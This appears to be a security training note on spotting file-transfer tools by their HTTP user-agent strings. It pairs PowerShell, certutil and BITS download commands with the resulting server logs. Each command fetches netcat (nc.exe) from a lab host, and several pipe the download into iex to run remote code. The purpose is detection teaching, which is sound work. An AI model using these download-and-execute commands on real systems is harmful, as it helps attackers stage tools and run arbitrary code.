Detection based on command-line blacklisting is easy to evade using techniques like case obfuscation, while whitelisting, though initially time-consuming, offers stronger and faster anomaly detection. HTTP protocols rely on client-server negotiation, with user agent strings helping servers identify clients such as browsers or tools like cURL and sqlmap. These strings are not limited to browsers and can be used by scripts or automated tools, making them useful indicators in traffic analysis. Organizations can improve detection by compiling lists of known legitimate user agents and using them in SIEM tools to isolate suspicious activity for investigation.
### Invoke-WebRequest - Client
```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
#### Invoke-WebRequest - Server
```bash
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```
### WinHttpRequest - Client
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```
#### WinHttpRequest - Server

```bash
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### Msxml2 - Client

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```
#### Msxml2 - Server

```bash
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
### Certutil - Client

```bash
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Server

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### BITS - Client

```powershell
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r=gc $env:temp\t;
rm $env:temp\t; 
iex $r
```

#### BITS - Server

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```